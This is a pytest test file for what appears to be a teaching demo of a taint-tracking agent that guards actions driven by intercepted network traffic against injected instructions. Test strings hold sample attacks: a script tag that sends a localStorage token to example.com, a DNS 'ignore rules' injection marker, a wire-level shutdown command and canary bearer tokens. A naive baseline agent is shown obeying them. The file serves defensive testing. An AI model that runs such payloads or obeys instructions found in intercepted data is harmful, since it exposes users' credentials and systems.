#!/usr/bin/env python3
"""
Tests for Demo 09: InterceptBound

Every test here pins a *property* of the code, not a fixture label: the
detector must work without the fixture's answer key, the guard must be the
thing that decides, the buffer must really bound and zero its copies, and the
scope gate must fire before parsing.
"""

import copy
import json
import re
import sys
import time
from pathlib import Path

import pytest

DEMO_DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(DEMO_DIR / "student"))
from interceptbound import (  # noqa: E402
    TrafficFrame, TaintTracker, EphemeralBuffer, ActionGuard, ContentDetector,
    BaselineAgent, TaintAwareAgent, Provenance, TaintLevel, ParsedField,
    candidate_actions, load_frames,
)
import generate_intercept_results  # noqa: E402


@pytest.fixture
def data():
    return json.loads((DEMO_DIR / "fixtures" / "traffic.json").read_text())


@pytest.fixture
def frames(data):
    return load_frames(data)


@pytest.fixture
def by_id(frames):
    return {f.id: f for f in frames}


@pytest.fixture
def scope(data):
    return data["scope_policy"]


@pytest.fixture
def buffer_config(data):
    return data["ephemeral_buffer"]


def blocked_actions(result):
    return [b["action"] for b in result["blocked"]]


def allowed_actions(result):
    return [a["action"] for a in result["actions"]]


class TestTaintPropagation:

    def test_every_leaf_inherits_frame_label(self, frames):
        """HIGH and MEDIUM frames alike: every leaf carries the frame's label."""
        for frame in frames:
            parsed = TaintTracker().parse_frame(frame)
            assert parsed, frame.id
            for p in parsed:
                assert p.taint == frame.taint
                assert p.provenance == frame.provenance
                assert p.source_frame == frame.id

    def test_nested_structures_flatten_to_named_leaves(self, by_id):
        names = [p.name for p in TaintTracker().parse_frame(by_id["frame_003"])]
        assert names == ["query", "answers[0].type", "answers[0].value", "answers[1].type", "answers[1].value_INJECTION"]
        names = [p.name for p in TaintTracker().parse_frame(by_id["frame_004"])]
        assert "extensions[0]" in names and "cert_fingerprint" in names

    def test_parser_does_not_invent_or_upgrade_taint(self, by_id):
        low = copy.deepcopy(by_id["frame_001"])
        low.taint = TaintLevel.LOW
        assert {p.taint for p in TaintTracker().parse_frame(low)} == {TaintLevel.LOW}


class TestDetection:

    def test_detection_does_not_read_the_annotation(self, frames, scope, buffer_config):
        """Strip the fixture's `injection` answer key: the guarded verdicts must not change."""
        reference = [TaintAwareAgent(scope, buffer_config).process(f) for f in frames]
        stripped = [copy.deepcopy(f) for f in frames]
        for f in stripped:
            f.injection = None
        again = [TaintAwareAgent(scope, buffer_config).process(f) for f in stripped]
        assert again == reference

    def test_annotation_cannot_plant_a_detection(self, by_id, scope, buffer_config):
        clean = copy.deepcopy(by_id["frame_004"])
        clean.injection = "TLS 1.3"           # claim an innocuous value is 'the injection'
        result = TaintAwareAgent(scope, buffer_config).process(clean)
        assert "process_injection" not in blocked_actions(result)

    def test_every_planted_injection_is_found_in_wire_data(self, frames):
        for frame in frames:
            if frame.injection:
                parsed = TaintTracker().parse_frame(frame)
                carriers = [p for p in parsed if frame.injection in str(p.value)]
                assert carriers, f"{frame.id}: planted injection is not in any wire field"
                assert all(p.injection_flags for p in carriers), frame.id

    def test_shutdown_command_is_in_the_wire_payload(self, by_id):
        assert '"command": "shutdown"' in by_id["frame_005"].fields["payload"]

    def test_detector_rules_are_named(self):
        assert ContentDetector.injections("x CANARY_DNS_INJECTION_IGNORE_RULES") == ["canary_marker", "instruction_phrase"]
        assert ContentDetector.injections("<script>fetch('http://example.com/x')</script>") == ["script_tag", "js_exfil"]
        assert ContentDetector.commands('{"command": "shutdown"}') == ["privileged_command"]
        assert ContentDetector.commands('{"command": "status"}') == []

    def test_credential_rule_ignores_javascript_property_access(self):
        """frame_002's `localStorage.token` is code, not a credential (no duplicate store_token)."""
        assert ContentDetector.credentials("fetch('http://example.com/steal?token='+localStorage.token)") == []
        assert ContentDetector.credentials('{"token": "DEMO_TOKEN_ABC123"}') == ["json_credential"]
        assert ContentDetector.credentials('Bearer realm="api"') == []
        assert ContentDetector.credentials("Bearer CANARY_SECRET_AUTH_9999") == ["bearer_token"]

    def test_no_duplicate_verdicts_per_field(self, frames, scope, buffer_config):
        agent = TaintAwareAgent(scope, buffer_config)
        for frame in frames:
            result = agent.process(frame)
            keys = [(x["action"], x.get("field")) for x in result["blocked"] + result["actions"]]
            assert len(keys) == len(set(keys)), (frame.id, keys)


class TestActionGuard:

    def test_taint_ceiling_per_action(self, scope):
        guard = ActionGuard(scope["max_taint_for_action"], scope["action_ceilings"])
        assert guard.authorize("record_observation", TaintLevel.HIGH, "x", Provenance.INTERCEPTED_NETWORK) == (True, "authorized")
        assert guard.authorize("update_dns_cache", TaintLevel.MEDIUM, "x", Provenance.INTERCEPTED_NETWORK) == (True, "authorized")
        assert guard.authorize("update_dns_cache", TaintLevel.HIGH, "x", Provenance.INTERCEPTED_NETWORK) == (False, "taint_too_high: high > medium")
        assert guard.authorize("store_credential", TaintLevel.HIGH, "x", Provenance.INTERCEPTED_NETWORK) == (False, "taint_too_high: high > low")
        assert guard.authorize("store_credential", TaintLevel.MEDIUM, "x", Provenance.TRUSTED_LOCAL) == (False, "taint_too_high: medium > low")
        assert guard.authorize("store_credential", TaintLevel.LOW, "x", Provenance.TRUSTED_LOCAL) == (True, "authorized")

    def test_unknown_action_gets_default_ceiling(self, scope):
        guard = ActionGuard("low", scope["action_ceilings"])
        assert guard.authorize("send_email", TaintLevel.MEDIUM, "x", Provenance.TRUSTED_LOCAL)[0] is False
        assert guard.authorize("send_email", TaintLevel.LOW, "x", Provenance.TRUSTED_LOCAL)[0] is True

    def test_provenance_rule_blocks_laundered_labels(self, scope):
        """Rule 2: allowed by the taint ceiling alone, blocked by provenance."""
        guard = ActionGuard(scope["max_taint_for_action"], scope["action_ceilings"])
        ok, why = guard.authorize("store_credential", TaintLevel.LOW, "tok", Provenance.INTERCEPTED_NETWORK)
        assert (ok, why) == (False, "intercepted_network_cannot_drive_privileged_action")
        assert guard.authorize("store_credential", TaintLevel.LOW, "tok", Provenance.USER_SUPPLIED)[0] is True
        # non-privileged actions are not subject to rule 2
        assert guard.authorize("update_dns_cache", TaintLevel.LOW, "x", Provenance.INTERCEPTED_NETWORK)[0] is True

    def test_accepts_string_or_enum_levels(self):
        assert ActionGuard("medium").ceiling_for("anything") == TaintLevel.MEDIUM
        assert ActionGuard(TaintLevel.HIGH, {"a": "low"}).ceiling_for("a") == TaintLevel.LOW


class TestGuardedAgent:

    def test_guarded_blocks_token_storage(self, by_id, scope, buffer_config):
        result = TaintAwareAgent(scope, buffer_config).process(by_id["frame_001"])
        assert [b for b in result["blocked"] if b["action"] == "store_token"] == \
            [{"action": "store_token", "field": "body", "reason": "taint_too_high: high > low"}]
        assert allowed_actions(result) == ["record_observation"]

    def test_guarded_blocks_shutdown(self, by_id, scope, buffer_config):
        result = TaintAwareAgent(scope, buffer_config).process(by_id["frame_005"])
        assert blocked_actions(result) == ["process_injection", "execute_shutdown"]
        assert result["actions"] == []
        assert result["taint_tracked"] is True

    def test_dns_injection_detected_and_cache_update_blocked(self, by_id, scope, buffer_config):
        result = TaintAwareAgent(scope, buffer_config).process(by_id["frame_003"])
        reasons = {b["action"]: b["reason"] for b in result["blocked"]}
        assert reasons["process_injection"] == "injection_detected: canary_marker,instruction_phrase"
        assert reasons["update_dns_cache"] == "taint_too_high: high > medium"

    def test_guarded_allows_clean_observations(self, by_id, scope, buffer_config):
        """A legitimate low-risk action really flows: the guard discriminates."""
        for fid in ("frame_004", "frame_006"):
            result = TaintAwareAgent(scope, buffer_config).process(by_id[fid])
            assert result["blocked"] == [], fid
            assert allowed_actions(result) == ["record_observation"], fid

    def test_guarded_allows_privileged_action_from_trusted_provenance(self, by_id, scope, buffer_config):
        result = TaintAwareAgent(scope, buffer_config).process(by_id["frame_008"])
        assert allowed_actions(result) == ["store_token"] and result["blocked"] == []

    def test_relabelled_intercepted_frame_still_cannot_store_token(self, by_id, scope, buffer_config):
        laundered = copy.deepcopy(by_id["frame_001"])
        laundered.taint = TaintLevel.LOW
        result = TaintAwareAgent(scope, buffer_config).process(laundered)
        assert {(b["action"], b["reason"]) for b in result["blocked"]} == \
            {("store_token", "intercepted_network_cannot_drive_privileged_action")}

    def test_agent_actually_consults_the_guard(self, by_id, scope, buffer_config):
        """Swap in a permissive guard: the agent must follow it (so a canned block would be caught)."""
        agent = TaintAwareAgent(scope, buffer_config)
        calls = []

        class Permissive(ActionGuard):
            def authorize(self, action, field_taint, data=None, provenance=None):
                calls.append((action, field_taint, provenance))
                return True, "authorized"

        agent.guard = Permissive()
        result = agent.process(by_id["frame_001"])
        assert ("store_credential", TaintLevel.HIGH, Provenance.INTERCEPTED_NETWORK) in calls
        assert "store_token" in allowed_actions(result)

    def test_source_scope_enforced_before_parsing(self, by_id, scope, buffer_config):
        agent = TaintAwareAgent(scope, buffer_config)
        calls = []
        agent.tracker.parse_frame = lambda frame: calls.append(frame.id) or []
        result = agent.process(by_id["frame_007"])
        assert result == {"frame": "frame_007", "actions": [],
                          "blocked": [{"action": "process_frame", "reason": "source_not_allowed: 10.0.0.99"}],
                          "parsed_fields": 0, "taint_tracked": False, "exit": "scope_blocked"}
        assert calls == []
        assert len(agent.buffer) == 0

    def test_destination_scope_enforced(self, by_id, scope, buffer_config):
        frame = copy.deepcopy(by_id["frame_004"])
        frame.dst = "203.0.113.5:443"
        result = TaintAwareAgent(scope, buffer_config).process(frame)
        assert result["blocked"] == [{"action": "process_frame", "reason": "destination_not_allowed: 203.0.113.5"}]

    def test_scope_handles_port_less_and_ipv6_addresses(self, scope, buffer_config):
        agent = TaintAwareAgent(scope, buffer_config)
        assert agent._host_of("192.168.1.10") == "192.168.1.10"
        assert agent._host_of("[fe80::1]:443") == "fe80::1"
        assert agent._host_of("fe80::1") == "fe80::1"

    def test_result_shape_is_uniform(self, frames, scope, buffer_config):
        agent = TaintAwareAgent(scope, buffer_config)
        for frame in frames:
            result = agent.process(frame)
            assert set(result) == {"frame", "actions", "blocked", "parsed_fields", "taint_tracked", "exit"}
            assert isinstance(result["blocked"], list) and isinstance(result["actions"], list)


class TestBaseline:

    def test_baseline_executes_from_wire_data_without_annotation(self, by_id):
        frame = copy.deepcopy(by_id["frame_005"])
        frame.injection = None
        result = BaselineAgent().process(frame)
        assert allowed_actions(result) == ["execute_shutdown"]
        assert result["taint_tracked"] is False

    def test_baseline_stores_forged_and_out_of_scope_tokens(self, by_id):
        assert "store_token" in allowed_actions(BaselineAgent().process(by_id["frame_001"]))
        assert "store_token" in allowed_actions(BaselineAgent().process(by_id["frame_007"]))

    def test_baseline_follows_injected_instructions(self, by_id):
        result = BaselineAgent().process(by_id["frame_002"])
        assert {"action": "follow_instruction", "field": "body_INJECTION", "reason": "script_tag,js_exfil"} in result["actions"]

    def test_both_agents_derive_the_same_candidates(self, frames):
        for frame in frames:
            for p in TaintTracker().parse_frame(frame):
                assert candidate_actions(frame, p) == candidate_actions(frame, p)


class TestEphemeralBuffer:

    def test_secure_delete_zeroes_the_buffers_copy(self, buffer_config):
        buffer = EphemeralBuffer(**buffer_config)
        buffer.add("test", "secret_data")
        raw = buffer.raw_copy("test")
        assert buffer.get("test") == "secret_data"
        assert b"secret_data" in bytes(raw)
        assert buffer.delete("test") is True
        assert buffer.get("test") is None
        assert bytes(raw) == b"\0" * len(raw)
        assert buffer.stats["zeroed"] == 1

    def test_without_secure_delete_copy_is_not_zeroed(self):
        buffer = EphemeralBuffer(max_size=10, ttl_seconds=60, secure_delete=False)
        buffer.add("k", "v")
        raw = buffer.raw_copy("k")
        buffer.delete("k")
        assert bytes(raw) != b"\0" * len(raw) and buffer.stats["zeroed"] == 0

    def test_max_size_bounds_live_data_and_zeroes_evictions(self):
        buffer = EphemeralBuffer(max_size=3, ttl_seconds=60, secure_delete=True)
        raws = []
        for i in range(10):
            buffer.add(f"k{i}", f"secret{i}")
            raws.append(buffer.raw_copy(f"k{i}"))
        assert len(buffer) == 3
        assert buffer.get("k0") is None and buffer.get("k9") == "secret9"
        assert all(bytes(r) == b"\0" * len(r) for r in raws[:7])
        assert buffer.stats["evicted"] == 7

    def test_ttl_expiry_on_get_and_cleanup(self):
        buffer = EphemeralBuffer(max_size=10, ttl_seconds=0, secure_delete=True)
        buffer.add("a", "data")
        buffer.add("b", "data")
        time.sleep(0.01)
        assert buffer.get("a") is None
        assert buffer.cleanup_expired() == 1
        assert len(buffer) == 0 and buffer.stats["expired"] == 2

    def test_pipeline_releases_every_frame_it_decided(self, frames, scope, buffer_config):
        agent = TaintAwareAgent(scope, buffer_config)
        for frame in frames:
            agent.process(frame)
            assert len(agent.buffer) == 0, frame.id
        stats = agent.buffer.stats
        assert stats["stored"] > 0 and stats["zeroed"] == stats["stored"]


class TestResultsAndSafety:

    def test_generator_matches_fixture_expectations(self):
        out = generate_intercept_results.run(DEMO_DIR)
        assert out["mismatches"] == []
        assert out["result"] == "pass"
        assert out["summary"]["block_reasons"] == ["injection_detected", "source_not_allowed", "taint_too_high"]
        assert out["summary"]["guarded_allowed"] > 0
        assert out["summary"]["buffer"]["live_entries_after_run"] == 0

    def test_generator_reports_a_wrong_expectation(self, tmp_path, data):
        doctored = copy.deepcopy(data)
        doctored["traffic_frames"][0]["expected"]["guarded_allowed"] = ["store_token"]
        (tmp_path / "fixtures").mkdir()
        (tmp_path / "fixtures" / "traffic.json").write_text(json.dumps(doctored))
        out = generate_intercept_results.run(tmp_path)
        assert out["result"] == "fail" and out["mismatches"]

    def test_no_network_or_process_imports(self):
        src = (DEMO_DIR / "student" / "interceptbound.py").read_text()
        for mod in ("socket", "requests", "urllib", "http.client", "aiohttp", "httpx", "subprocess", "scapy"):
            assert not re.search(rf"^\s*(import|from)\s+{re.escape(mod)}\b", src, re.M), mod


class TestExercises:
    """Starting points for the exercises in INSTRUCTIONS.md."""

    def test_exercise_credential_canary(self):
        """Exercise 9.5 starting point: a credential-like canary is flagged both as
        credential and as injection, with HIGH taint from the frame."""
        frame = TrafficFrame("ex_canary_01", "http", "10.0.0.1", "10.0.0.2", "inbound",
                             {"auth_header": "Bearer CANARY_SECRET_AUTH_9999"},
                             Provenance.INTERCEPTED_NETWORK, TaintLevel.HIGH, "CANARY_SECRET")
        fields = TaintTracker().parse_frame(frame)
        assert [f.name for f in fields] == ["auth_header_INJECTION"]
        assert fields[0].credential_flags == ["bearer_token"]
        assert fields[0].injection_flags == ["canary_marker"]
        assert fields[0].taint == TaintLevel.HIGH

    def test_exercise_taint_refinement_must_be_justified(self, scope):
        """Exercise 9.2 starting point: refining `status` to MEDIUM does not make it
        actionable for privileged operations."""
        guard = ActionGuard(scope["max_taint_for_action"], scope["action_ceilings"])
        refined = ParsedField("status", 200, Provenance.INTERCEPTED_NETWORK, TaintLevel.MEDIUM, "frame_001")
        assert guard.authorize("record_observation", refined.taint, refined.value, refined.provenance)[0] is True
        assert guard.authorize("store_credential", refined.taint, refined.value, refined.provenance)[0] is False


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
